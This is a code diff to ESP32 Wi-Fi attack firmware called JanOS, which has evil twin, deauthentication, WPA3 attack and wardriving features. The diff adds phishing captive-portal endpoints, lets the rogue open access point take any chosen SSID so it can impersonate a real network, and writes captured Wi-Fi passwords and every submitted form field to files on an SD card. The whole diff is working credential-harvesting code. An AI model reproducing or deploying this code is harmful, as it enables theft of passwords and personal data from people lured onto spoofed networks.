@@ -56,7 +56,7 @@
 #include "lwip/dhcp.h"
 
 //Version number
-#define JANOS_VERSION "0.1.0"
+#define JANOS_VERSION "0.2.0"
 
 
 #define NEOPIXEL_GPIO      27
@@ -252,6 +252,7 @@ static int g_selected_count = 0;
 
 char * evilTwinSSID = NULL;
 char * evilTwinPassword = NULL;
+char * portalSSID = NULL;  // SSID for standalone portal mode
 int connectAttemptCount = 0;
 led_strip_handle_t strip;
 static bool last_password_wrong = false;
@@ -299,6 +300,8 @@ static void dns_server_task(void *pvParameters);
 static esp_err_t root_handler(httpd_req_t *req);
 static esp_err_t portal_handler(httpd_req_t *req);
 static esp_err_t login_handler(httpd_req_t *req);
+static esp_err_t get_handler(httpd_req_t *req);
+static esp_err_t save_handler(httpd_req_t *req);
 static esp_err_t android_captive_handler(httpd_req_t *req);
 static esp_err_t ios_captive_handler(httpd_req_t *req);
 static esp_err_t captive_detection_handler(httpd_req_t *req);
@@ -319,6 +322,9 @@ static void get_timestamp_string(char* buffer, size_t size);
 static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
 static bool wait_for_gps_fix(int timeout_seconds);
 static int find_next_wardrive_file_number(void);
+// Portal data logging functions
+static void save_evil_twin_password(const char* ssid, const char* password);
+static void save_portal_data(const char* ssid, const char* form_data);
 // SAE WPA3 attack methods forward declarations:
 //add methods declarations below:
 static void inject_sae_commit_frame();
@@ -461,6 +467,15 @@ static void wifi_event_handler(void *event_handler_arg,
                 }
                 
                 MY_LOG_INFO(TAG, "Evil Twin portal shut down successfully!");
+                
+                // Small delay to ensure all resources are properly released
+                vTaskDelay(pdMS_TO_TICKS(500));
+                
+                // Now save verified password to SD card (after portal is fully closed)
+                if (evilTwinSSID != NULL && evilTwinPassword != NULL) {
+                    MY_LOG_INFO(TAG, "Saving verified password to SD card...");
+                    save_evil_twin_password(evilTwinSSID, evilTwinPassword);
+                }
             }
             
             applicationState = IDLE;
@@ -1665,6 +1680,22 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             };
             httpd_register_uri_handler(portal_server, &login_uri);
             
+            httpd_uri_t get_uri = {
+                .uri = "/get",
+                .method = HTTP_GET,
+                .handler = get_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &get_uri);
+            
+            httpd_uri_t save_uri = {
+                .uri = "/save",
+                .method = HTTP_POST,
+                .handler = save_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &save_uri);
+            
             httpd_uri_t android_captive_uri = {
                 .uri = "/generate_204",
                 .method = HTTP_GET,
@@ -1933,6 +1964,12 @@ static int cmd_stop(int argc, char **argv) {
         // Stop AP mode
         esp_wifi_stop();
         MY_LOG_INFO(TAG, "Portal stopped.");
+        
+        // Clean up portal SSID
+        if (portalSSID != NULL) {
+            free(portalSSID);
+            portalSSID = NULL;
+        }
     }
     
     // Clear LED (ignore errors if LED is in invalid state)
@@ -2610,9 +2647,12 @@ static esp_err_t login_handler(httpd_req_t *req) {
         // Log the password
         MY_LOG_INFO(TAG, "Portal password received: %s", decoded_password);
         
-        // If in evil twin mode, verify the password
+        // If in evil twin mode, verify the password (save will happen after verification)
         if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
             verify_password(decoded_password);
+        } else {
+            // Regular portal mode - save all form data to portals.txt
+            save_portal_data(portalSSID, buf);
         }
     }
     
@@ -2643,6 +2683,209 @@ static esp_err_t login_handler(httpd_req_t *req) {
             "</body></html>";
     } else {
         // Show "Processing" message
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Processing</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
+            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Verifying...</h1>"
+            "<div class='spinner'></div>"
+            "<p>Please wait while we verify your credentials.</p>"
+            "</div>"
+            "</body></html>";
+    }
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// HTTP handler for GET /get endpoint
+static esp_err_t get_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "GET handler called - URI: %s", req->uri);
+    
+    // Get query string
+    size_t query_len = httpd_req_get_url_query_len(req);
+    if (query_len > 0) {
+        char *query_string = malloc(query_len + 1);
+        if (query_string) {
+            if (httpd_req_get_url_query_str(req, query_string, query_len + 1) == ESP_OK) {
+                MY_LOG_INFO(TAG, "Received GET query: %s", query_string);
+                
+                // Parse password from query string
+                char password_param[64];
+                if (httpd_query_key_value(query_string, "password", password_param, sizeof(password_param)) == ESP_OK) {
+                    // URL decode the password
+                    char decoded_password[64];
+                    int decoded_len = 0;
+                    for (char *p = password_param; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
+                        if (*p == '%' && p[1] && p[2]) {
+                            char hex[3] = {p[1], p[2], '\0'};
+                            decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
+                            p += 2;
+                        } else if (*p == '+') {
+                            decoded_password[decoded_len++] = ' ';
+                        } else {
+                            decoded_password[decoded_len++] = *p;
+                        }
+                    }
+                    decoded_password[decoded_len] = '\0';
+                    
+                    // Log the password
+                    MY_LOG_INFO(TAG, "Portal password received (GET): %s", decoded_password);
+                    
+                    // If in evil twin mode, verify the password (save will happen after verification)
+                    if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+                        verify_password(decoded_password);
+                    } else {
+                        // Regular portal mode - save all form data to portals.txt
+                        // For GET requests, query_string has same format as POST data
+                        save_portal_data(portalSSID, query_string);
+                    }
+                }
+            }
+            free(query_string);
+        }
+    }
+    
+    // Send response
+    const char* response;
+    if (last_password_wrong) {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Wrong Password</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
+            "a:hover { background: #0056b3; }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Wrong Password</h1>"
+            "<p>The password you entered is incorrect. Please try again.</p>"
+            "<a href='/portal'>Try Again</a>"
+            "</div>"
+            "</body></html>";
+    } else {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Processing</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
+            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Verifying...</h1>"
+            "<div class='spinner'></div>"
+            "<p>Please wait while we verify your credentials.</p>"
+            "</div>"
+            "</body></html>";
+    }
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// HTTP handler for POST /save endpoint
+static esp_err_t save_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Save handler called - URI: %s", req->uri);
+    
+    char buf[256];
+    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (ret <= 0) {
+        MY_LOG_INFO(TAG, "Failed to receive POST data");
+        return ESP_FAIL;
+    }
+    buf[ret] = '\0';
+    
+    MY_LOG_INFO(TAG, "Received POST data: %s", buf);
+    
+    // Parse password from POST data
+    char *password_start = strstr(buf, "password=");
+    if (password_start) {
+        password_start += 9; // Skip "password="
+        char *password_end = strchr(password_start, '&');
+        if (password_end) {
+            *password_end = '\0';
+        }
+        
+        // URL decode the password
+        char decoded_password[64];
+        int decoded_len = 0;
+        for (char *p = password_start; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
+            if (*p == '%' && p[1] && p[2]) {
+                char hex[3] = {p[1], p[2], '\0'};
+                decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
+                p += 2;
+            } else if (*p == '+') {
+                decoded_password[decoded_len++] = ' ';
+            } else {
+                decoded_password[decoded_len++] = *p;
+            }
+        }
+        decoded_password[decoded_len] = '\0';
+        
+        // Log the password
+        MY_LOG_INFO(TAG, "Portal password received (SAVE): %s", decoded_password);
+        
+        // If in evil twin mode, verify the password (save will happen after verification)
+        if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+            verify_password(decoded_password);
+        } else {
+            // Regular portal mode - save all form data to portals.txt
+            save_portal_data(portalSSID, buf);
+        }
+    }
+    
+    // Send response
+    const char* response;
+    if (last_password_wrong) {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Wrong Password</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
+            "a:hover { background: #0056b3; }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Wrong Password</h1>"
+            "<p>The password you entered is incorrect. Please try again.</p>"
+            "<a href='/portal'>Try Again</a>"
+            "</div>"
+            "</body></html>";
+    } else {
         response = 
             "<!DOCTYPE html><html><head>"
             "<meta charset='UTF-8'>"
@@ -2954,7 +3197,12 @@ static void dns_server_task(void *pvParameters) {
 
 // Start portal command
 static int cmd_start_portal(int argc, char **argv) {
-    (void)argc; (void)argv;
+    // Check for SSID argument
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: start_portal <SSID>");
+        MY_LOG_INFO(TAG, "Example: start_portal MyWiFi");
+        return 1;
+    }
     
     // Check if portal is already running
     if (portal_active) {
@@ -2962,7 +3210,25 @@ static int cmd_start_portal(int argc, char **argv) {
         return 0;
     }
     
-    MY_LOG_INFO(TAG, "Starting captive portal...");
+    const char *ssid = argv[1];
+    size_t ssid_len = strlen(ssid);
+    
+    // Validate SSID length (WiFi SSID max is 32 characters)
+    if (ssid_len == 0 || ssid_len > 32) {
+        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
+        return 1;
+    }
+    
+    // Store portal SSID for logging purposes
+    if (portalSSID != NULL) {
+        free(portalSSID);
+    }
+    portalSSID = malloc(ssid_len + 1);
+    if (portalSSID != NULL) {
+        strcpy(portalSSID, ssid);
+    }
+    
+    MY_LOG_INFO(TAG, "Starting captive portal with SSID: %s", ssid);
     
     // Get AP netif and stop DHCP to configure custom IP
     esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
@@ -2988,17 +3254,14 @@ static int cmd_start_portal(int argc, char **argv) {
     
     MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
     
-    // Configure AP
-    wifi_config_t ap_config = {
-        .ap = {
-            .ssid = "Portal",
-            .ssid_len = 6,
-            .channel = 1,
-            .password = "",
-            .max_connection = 4,
-            .authmode = WIFI_AUTH_OPEN
-        }
-    };
+    // Configure AP with provided SSID
+    wifi_config_t ap_config = {0};
+    memcpy(ap_config.ap.ssid, ssid, ssid_len);
+    ap_config.ap.ssid_len = ssid_len;
+    ap_config.ap.channel = 1;
+    ap_config.ap.password[0] = '\0';
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
     
     // Start AP
     ret = esp_wifi_set_mode(WIFI_MODE_AP);
@@ -3083,6 +3346,24 @@ static int cmd_start_portal(int argc, char **argv) {
         .user_ctx = NULL
     };
     httpd_register_uri_handler(portal_server, &login_uri);
+    
+    // GET handler
+    httpd_uri_t get_uri = {
+        .uri = "/get",
+        .method = HTTP_GET,
+        .handler = get_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &get_uri);
+    
+    // Save handler
+    httpd_uri_t save_uri = {
+        .uri = "/save",
+        .method = HTTP_POST,
+        .handler = save_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &save_uri);
     
     // Android captive portal detection
     httpd_uri_t android_captive_uri = {
@@ -3173,9 +3454,9 @@ static int cmd_start_portal(int argc, char **argv) {
     MY_LOG_INFO(TAG, "DNS server task started");
     
     MY_LOG_INFO(TAG, "Captive portal started successfully!");
-    MY_LOG_INFO(TAG, "AP Name: Portal");
+    MY_LOG_INFO(TAG, "AP Name: %s", ssid);
     MY_LOG_INFO(TAG, "AP IP: 172.0.0.1");
-    MY_LOG_INFO(TAG, "Connect to 'Portal' WiFi network to access the portal");
+    MY_LOG_INFO(TAG, "Connect to '%s' WiFi network to access the portal", ssid);
     MY_LOG_INFO(TAG, "DNS server running on port 53 - all queries redirect to 172.0.0.1");
     MY_LOG_INFO(TAG, "HTTP server running on port 80");
     
@@ -3297,7 +3578,7 @@ static void register_commands(void)
 
     const esp_console_cmd_t portal_cmd = {
         .command = "start_portal",
-        .help = "Starts captive portal with password form",
+        .help = "Starts captive portal with password form: start_portal <SSID>",
         .hint = NULL,
         .func = &cmd_start_portal,
         .argtable = NULL
@@ -3421,7 +3702,7 @@ void app_main(void) {
     MY_LOG_INFO(TAG,"  sae_overflow");
     MY_LOG_INFO(TAG,"  start_blackout");
     MY_LOG_INFO(TAG,"  start_wardrive");
-    MY_LOG_INFO(TAG,"  start_portal");
+    MY_LOG_INFO(TAG,"  start_portal <SSID>");
     MY_LOG_INFO(TAG,"  list_sd");
     MY_LOG_INFO(TAG,"  select_html <index>");
     MY_LOG_INFO(TAG,"  start_sniffer");
@@ -4386,7 +4667,7 @@ static esp_err_t init_sd_card(void) {
     // Options for mounting the filesystem (optimized for low memory)
     esp_vfs_fat_sdmmc_mount_config_t mount_config = {
         .format_if_mount_failed = false,  // Don't format automatically to save memory
-        .max_files = 3,                   // Reduced from 10 to 3 to save memory
+        .max_files = 5,                   // Increased to 5 for password logging
         .allocation_unit_size = 0,        // Use default (512 bytes) to save memory
         .disk_status_check_enable = false
     };
@@ -4622,6 +4903,167 @@ static int find_next_wardrive_file_number(void) {
     MY_LOG_INFO(TAG, "Highest existing file number: %d, next will be: %d", max_number, next_number);
     
     return next_number;
+}
+
+// Save evil twin password to SD card
+static void save_evil_twin_password(const char* ssid, const char* password) {
+    // Initialize SD card if not already mounted
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card for password logging: %s", esp_err_to_name(ret));
+        return;
+    }
+    
+    // Check if /sdcard directory is accessible
+    struct stat st;
+    if (stat("/sdcard", &st) != 0) {
+        MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
+        return;
+    }
+    
+    // Try to open file for appending (use short name without underscore for FAT compatibility)
+    FILE *file = fopen("/sdcard/eviltwin.txt", "a");
+    if (file == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open eviltwin.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
+        
+        // Try to create the file first
+        file = fopen("/sdcard/eviltwin.txt", "w");
+        if (file == NULL) {
+            MY_LOG_INFO(TAG, "Failed to create eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
+            return;
+        }
+        // Close and reopen in append mode
+        fclose(file);
+        file = fopen("/sdcard/eviltwin.txt", "a");
+        if (file == NULL) {
+            MY_LOG_INFO(TAG, "Failed to reopen eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
+            return;
+        }
+        MY_LOG_INFO(TAG, "Successfully created eviltwin.txt");
+    }
+    
+    // Write SSID and password in CSV format
+    fprintf(file, "\"%s\", \"%s\"\n", ssid, password);
+    
+    // Flush and close file to ensure data is written to disk
+    fflush(file);
+    fclose(file);
+    
+    MY_LOG_INFO(TAG, "Password saved to eviltwin.txt");
+}
+
+// Save portal form data to SD card
+static void save_portal_data(const char* ssid, const char* form_data) {
+    // Initialize SD card if not already mounted
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card for portal data logging: %s", esp_err_to_name(ret));
+        return;
+    }
+    
+    // Check if /sdcard directory is accessible
+    struct stat st;
+    if (stat("/sdcard", &st) != 0) {
+        MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
+        return;
+    }
+    
+    // Try to open file for appending
+    FILE *file = fopen("/sdcard/portals.txt", "a");
+    if (file == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open portals.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
+        
+        // Try to create the file first
+        file = fopen("/sdcard/portals.txt", "w");
+        if (file == NULL) {
+            MY_LOG_INFO(TAG, "Failed to create portals.txt, errno: %d (%s)", errno, strerror(errno));
+            return;
+        }
+        // Close and reopen in append mode
+        fclose(file);
+        file = fopen("/sdcard/portals.txt", "a");
+        if (file == NULL) {
+            MY_LOG_INFO(TAG, "Failed to reopen portals.txt, errno: %d (%s)", errno, strerror(errno));
+            return;
+        }
+        MY_LOG_INFO(TAG, "Successfully created portals.txt");
+    }
+    
+    // Write SSID as first field
+    fprintf(file, "\"%s\", ", ssid ? ssid : "Unknown");
+    
+    // Parse form data and extract all fields
+    // Form data is in format: field1=value1&field2=value2&...
+    char *data_copy = strdup(form_data);
+    if (data_copy == NULL) {
+        fclose(file);
+        return;
+    }
+    
+    // Count fields first to properly format CSV
+    int field_count = 0;
+    char *temp_copy = strdup(form_data);
+    if (temp_copy == NULL) {
+        MY_LOG_INFO(TAG, "Memory allocation failed for temp_copy");
+        free(data_copy);
+        fclose(file);
+        return;
+    }
+    
+    char *token = strtok(temp_copy, "&");
+    while (token != NULL) {
+        field_count++;
+        token = strtok(NULL, "&");
+    }
+    free(temp_copy);
+    
+    // Now process each field
+    int current_field = 0;
+    token = strtok(data_copy, "&");
+    while (token != NULL) {
+        char *equals = strchr(token, '=');
+        if (equals != NULL) {
+            *equals = '\0';
+            char *value = equals + 1;
+            
+            // URL decode the value
+            char decoded_value[128];
+            int decoded_len = 0;
+            for (char *p = value; *p && decoded_len < sizeof(decoded_value) - 1; p++) {
+                if (*p == '%' && p[1] && p[2]) {
+                    char hex[3] = {p[1], p[2], '\0'};
+                    decoded_value[decoded_len++] = (char)strtol(hex, NULL, 16);
+                    p += 2;
+                } else if (*p == '+') {
+                    decoded_value[decoded_len++] = ' ';
+                } else {
+                    decoded_value[decoded_len++] = *p;
+                }
+            }
+            decoded_value[decoded_len] = '\0';
+            
+            // Write field value in CSV format
+            fprintf(file, "\"%s\"", decoded_value);
+            
+            // Add comma if not last field
+            current_field++;
+            if (current_field < field_count) {
+                fprintf(file, ", ");
+            }
+        }
+        token = strtok(NULL, "&");
+    }
+    
+    // End line
+    fprintf(file, "\n");
+    
+    // Flush and close file to ensure data is written to disk
+    fflush(file);
+    fclose(file);
+    
+    free(data_copy);
+    
+    MY_LOG_INFO(TAG, "Portal data saved to portals.txt");
 }
 
 
